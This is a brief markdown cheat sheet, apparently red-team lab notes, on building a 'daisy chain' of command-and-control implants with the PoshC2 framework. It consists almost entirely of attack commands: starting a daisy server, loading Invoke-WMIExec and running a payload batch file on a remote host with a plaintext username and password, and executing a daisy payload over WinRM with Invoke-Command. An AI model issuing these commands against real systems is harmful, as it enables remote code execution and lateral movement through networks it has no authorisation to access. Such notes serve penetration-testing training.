### Creating daisy chain using PoshC2
#### Starting a Daisy server
- ```startdaisy```
#### Invoking Daisy payload via WMI
- ```pslo Invoke-wmiexec.ps1```
- ```sharpps Invoke-WMIExec -user webadmin.ind01 -pass P@ssw0rd1 -target 192.168.3.18 -Command "/var/poshc2/ptadlab/payloads/testpayload.bat“```
#### Invoking Daisy payload via WinRM
- ```sharpps Invoke-Command -ScriptBlock {<daisy payload>} -computer ptadlabwin8-64```
